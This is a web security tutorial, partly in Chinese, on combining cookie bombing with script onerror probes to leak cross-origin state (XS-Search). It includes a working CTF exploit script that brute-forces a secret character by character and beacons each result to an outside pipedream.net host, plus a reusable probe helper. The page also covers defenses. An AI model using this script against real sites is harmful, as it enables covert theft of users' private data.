# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

This technique combines:
- Cookie bombing: 将大量/大尺寸 cookies 注入受害者的浏览器，针对 target origin，使后续请求触及服务器/请求限制（request header size、URL size in redirects 等）。
- Error-event oracle: 使用 <script>（或其他子资源）探测一个 cross-origin endpoint，并通过 onload vs onerror 区分状态。

High level idea
- 找到一个目标 endpoint，其在你想测试的两种状态下行为不同（例如，搜索 “hit” vs “miss”）。
- 确保“hit”路径会触发一个大型重定向链或很长的 URL，而“miss”路径保持较短。通过大量 cookies 膨胀请求头，使得只有“hit”路径导致服务器因超限而返回 HTTP 错误（例如 431/414/400）。该错误会翻转 onerror 事件，从而成为 XS-Search 的一个 oracle。

When does this work
- 你能够使受害者浏览器向目标发送 cookies（例如，cookies 为 SameSite=None，或你可以通过 popup 的 first-party context 使用 window.open 设置它们）。
- 存在可以被滥用的应用功能来设置任意 cookies（例如，将受控输入名/值转换为 Set-Cookie 的 “save preference” endpoint），或存在将攻击者可控数据包含进 URL 的 post-auth 重定向。
- 服务器在两种状态下有不同反应，并且在请求头/URL 被膨胀后，其中一种状态会越过限制并返回触发 onerror 的错误响应。

Note on server errors used as the oracle
- 431 Request Header Fields Too Large 通常在 cookies 膨胀请求头时返回；414 URI Too Long 或特定服务器的 400 也可能在请求目标过长时返回。任何这些都会导致子资源加载失败并触发 onerror。[MDN 文档记录了 431 及其典型原因（如过多的 cookies）。]()

Practical example (angstromCTF 2022)
The following script (from a public writeup) abuses a feature that lets the attacker insert arbitrary cookies, then loads a cross-origin search endpoint as a script. When the query is correct, the server performs a redirect that, together with the cookie bloat, exceeds server limits and returns an error status, so script.onerror fires; otherwise nothing happens.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
为什么使用弹出窗口 (window.open)？
- 现代浏览器越来越多地阻止 third-party cookies。打开一个 top-level window 指向目标会使 cookies 成为 first-party，因此来自目标的 Set-Cookie 响应会生效，从而即便在 third-party cookie 限制下也能完成 cookie-bomb 步骤。

通用探测助手
如果你已经有办法在目标 origin（first-party）上设置大量 cookies，你可以将这个最小化的 oracle 复用于任何当其成功/失败会导致不同网络结果（status/MIME/redirect）的 endpoint：
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Tips to build the oracle
- Force the “positive” state to be heavier: chain an extra redirect only when the predicate is true, or make the redirect URL reflect unbounded user input so it grows with the guessed prefix.
- Inflate headers: repeat cookie bombing until a consistent error is observed on the “heavy” path. Servers commonly cap header size and will fail sooner when many cookies are present.
- Stabilize: fire multiple parallel cookie set operations and probe repeatedly to average out timing and caching noise.

Related XS-Search tricks
- URL length based oracles (no cookies needed) can be combined or used instead when you can force a very long request target:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Defenses and hardening
- Make success/failure responses indistinguishable:
- Avoid conditional redirects or large differences in response size between states. Return the same status, same Content-Type, and similar body length regardless of state.
- Block cross-site subresource probes:
- SameSite cookies: set sensitive cookies to SameSite=Lax or Strict so subresource requests like <script src> don’t carry them; prefer Strict for auth tokens when possible.
- Fetch Metadata: enforce a Resource Isolation Policy to reject cross-site subresource loads (e.g., if Sec-Fetch-Site != same-origin/same-site).
- Cross-Origin-Resource-Policy (CORP): set CORP: same-origin (or at least same-site) for endpoints not meant to be embedded as cross-origin subresources.
- X-Content-Type-Options: nosniff and correct Content-Type on JSON/HTML endpoints to avoid load-as-script quirks.
- Reduce header/URL amplification:
- Cap the number/size of cookies set; sanitize features that turn arbitrary form fields into Set-Cookie.
- Normalize or truncate reflected data in redirects; avoid embedding attacker-controlled long strings in Location URLs.
- Keep server limits consistent and fail uniformly (avoid special error pages only for one branch).

Notes
- This class of attacks is discussed broadly as “Error Events” XS-Leaks. The cookie-bomb step is just a convenient way to push only one branch over server limits, producing a reliable boolean oracle.



## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
{{#include ../../banners/hacktricks-training.md}}
